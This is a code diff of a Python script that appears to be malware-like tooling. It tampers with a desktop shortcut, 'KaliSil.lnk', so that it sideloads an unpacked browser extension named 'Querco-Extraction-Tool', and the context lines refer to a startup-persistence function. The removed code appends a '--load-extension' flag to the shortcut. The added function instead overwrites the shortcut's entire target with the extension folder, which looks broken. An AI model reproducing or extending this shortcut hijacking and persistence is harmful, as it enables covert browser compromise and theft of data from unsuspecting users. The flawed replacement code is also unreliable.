@@ -73,6 +73,35 @@ def add_to_startup():
         )
 
 
+def modify_shortcut_target():
+    # Define the path to the desktop and the shortcut
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    shortcut_name = "KaliSil.lnk"
+    shortcut_path = os.path.join(desktop_path, shortcut_name)
+
+    # Check if the shortcut file exists
+    if not os.path.exists(shortcut_path):
+        print(f"Shortcut not found: {shortcut_path}")
+        return
+
+    # Define the new target path
+    new_target_path = os.path.join(
+        os.path.expanduser("~"), "Querco-Extraction-Tool")
+
+    # Load the shortcut
+    lnk = pylnk3.parse(shortcut_path)
+
+    # Set the new target path
+    lnk.target = new_target_path
+
+    # Save the modified shortcut
+    with open(shortcut_path, 'wb') as f:
+        f.write(lnk.to_bytes())
+
+    print(
+        f"Shortcut '{shortcut_name}' target modified to '{new_target_path}'.")
+
+
 if __name__ == "__main__":
     # while True:
     #     try:
@@ -83,28 +112,4 @@ if __name__ == "__main__":
     # add_to_startup()
 
     # Define the path to the shortcut on the desktop
-    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    shortcut_name = "KaliSil.lnk"
-    shortcut_path = os.path.join(desktop_path, shortcut_name)
-
-    # Define the path to the Chrome extension directory
-    extension_path = os.path.join(
-        os.path.expanduser("~"), "Querco-Extraction-Tool")
-
-    # Load the shortcut
-    lnk = pylnk3.parse(shortcut_path)
-
-    # Define the desired argument to load the Chrome extension
-    arg = f"--load-extension={extension_path}"
-
-    # Check if the arg is already present in the target of the shortcut
-    if arg in lnk.target:
-        print(
-            f"Shortcut '{shortcut_name}' already loads Chrome extension from '{extension_path}'.")
-    else:
-        # Add the arg to the target of the shortcut
-        lnk.target += f" {arg}"
-        lnk.save(shortcut_path)
-
-    print(
-        f"Shortcut '{shortcut_name}' modified to load Chrome extension from '{extension_path}'.")
+    modify_shortcut_target()
